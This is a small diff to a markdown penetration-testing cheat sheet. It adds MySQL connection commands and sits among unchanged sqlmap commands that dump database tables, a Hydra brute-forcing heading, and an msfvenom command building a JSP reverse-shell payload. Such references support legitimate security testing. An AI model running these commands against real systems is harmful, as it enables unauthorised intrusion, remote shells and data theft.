@@ -97,6 +97,16 @@ sqlmap -r login.req -D dbname -T table_name --dump
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
 ```
+## MYSQL
+
+**Remotely**
+
+mysql -u <user> -p<password> -h <IP> -D <dbname>
+
+**Locally**
+
+mysql -u <user> -p<password>
+
 
 ## Hydra
 **SSH & FTP Login Bruteforcing**
@@ -129,7 +139,7 @@ https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 ![alt text](https://raw.githubusercontent.com/SattamInfosec/SattamInfosec/main/XSS%20Via%20GET%20%26%20POST.PNG)
 
 ## msfvenom shells
-**JSP Java Meterpreter Reverse TCP**\
+**JSP Java Meterpreter Reverse TCP**
 ```sh
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
 ```
